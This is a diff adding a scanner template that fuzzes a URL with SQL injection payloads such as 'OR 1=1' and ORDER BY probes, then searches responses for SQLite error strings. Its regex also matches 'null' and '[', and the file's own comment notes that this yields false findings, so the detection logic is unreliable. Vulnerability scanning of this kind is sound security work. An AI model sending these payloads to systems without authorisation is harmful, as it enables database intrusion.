@@ -1,0 +1,23 @@
+id: sqli
+
+info:
+  name: SQL Injection
+  author: Practical DevSecOps
+  severity: high
+
+requests:
+  - method: GET
+    path:                                   # add more payloads here to fuzz further
+      - "{{BaseURL}} %22%22|0;#"
+      - "{{BaseURL}} %22 OR 1 = 1 ---#"
+      - "{{BaseURL}} OR 1=1"
+      - "{{BaseURL}} 1' ORDER BY 1,2,3--+"
+      - "{{BaseURL}} 1' GROUP BY 1,2,3--+"
+
+    # NB: an extractor alone (no matcher) reports every response the regex hits —
+    # including the literal "null" in a normal JSON body. Hence the [null] "finding".
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "SQLite/JDBCDriver|SQLite.Exception|System.Data.SQLite.SQLiteException|Warning.*sqlite_.*|Warning.*SQLite3::|SQLITE_ERROR|sqlite3.*|\\[|null"
